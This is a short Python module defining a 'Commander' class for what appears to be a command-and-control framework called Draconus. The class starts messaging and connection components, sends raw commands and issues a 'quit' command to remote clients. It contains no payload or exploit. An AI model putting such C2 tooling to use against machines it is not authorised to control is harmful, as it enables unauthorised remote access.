import sys
from time import sleep

from .tools.messanger_client import MessangerClient
from .tools.messages import Messages
from .tools.builder import Builder
from .tools.cmd_connector import CommanderConn
from .hive.queen import Queen

class Commander:
    def __init__(self, builder_object: Builder):
        self.name = "C2"
        self.CONF = builder_object
        self.FLAG_working = False
        self.Queen = Queen(self.CONF)
        
        self.QUIT_PAUSE = self.CONF.tcp_sock_to_listening + 1

    
    def build(self) -> bool:
        self.FLAG_working = True
        self.messages = Messages(self.CONF, self.name)
        self.msg = MessangerClient(self.CONF, self)
        if not self.msg.Start():
            print("[!!] ERROR: Draconus not started [!!]")
            return False
        self.c2Conn = CommanderConn(self, self.CONF)
        if not self.c2Conn.build():
            return False
        # set functions
        self.cmd_SendRaw = self.c2Conn.cmdSendRaw
        self.cmd_Recive = self.c2Conn.cmdReciveData
        return True
    
    def Exit(self) -> None:
        self.FLAG_working = False
        print("Closing.....")
        sleep(1)
        sys.exit()
    
    def Quit(self) -> None:
        self.cmd_SendRaw({"cmd_type" : "sys", "cmd" : "quit"})
        print("Closing....")
        sleep(self.QUIT_PAUSE)
        self.FLAG_working = False
        print("Exit Program")
       




